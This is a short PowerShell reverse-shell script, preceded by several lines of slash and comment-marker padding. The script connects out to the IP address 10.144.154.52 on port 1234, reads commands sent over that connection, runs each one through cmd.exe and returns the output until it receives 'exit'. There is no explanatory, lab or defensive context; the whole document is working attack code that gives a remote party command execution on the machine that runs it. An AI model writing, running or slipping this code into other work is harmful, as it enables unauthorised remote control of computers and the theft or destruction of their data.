/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* */
/* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* */
/* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* *//* */

$client = [System.Net.Sockets.TcpClient]:: new("10.144.154.52", 1234)
$stream = $client.GetStream()
$reader = New-object System.IO.StreamReader($stream)
$writer = New-object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
While ($true) {
	$command = $reader.ReadLine()
	if ($command -eq "exit") { break }
	$output = cmd.exe /c $command 2>&1 | Out-String
	$writer.WriteLine($output)
	$writer.Flush()
}
$client.Close()
